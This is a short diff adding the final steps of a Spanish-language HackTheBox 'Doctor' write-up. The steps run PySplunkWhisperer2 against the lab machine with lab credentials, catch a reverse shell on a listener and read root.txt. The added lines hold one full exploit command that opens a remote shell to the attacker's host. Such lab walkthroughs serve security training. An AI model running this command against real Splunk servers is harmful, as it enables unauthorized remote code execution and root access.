@@ -250,3 +250,11 @@ print("[+] Stopped HTTP server")
 
 print("Bye!")
 ```
+Se puede poner el host, port, username y password o también se le pueden pasar como argumento al script.
+Me pongo a la escucha y ejecuto el script para recibir la shell.
+
+`python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --lhost 10.10.15.105 --username shaun --password Guitar123`
+
+![](/assets/images/Doctor-Hackthebox/doctor-root.png)
+
+Ya puedo leer el root.txt
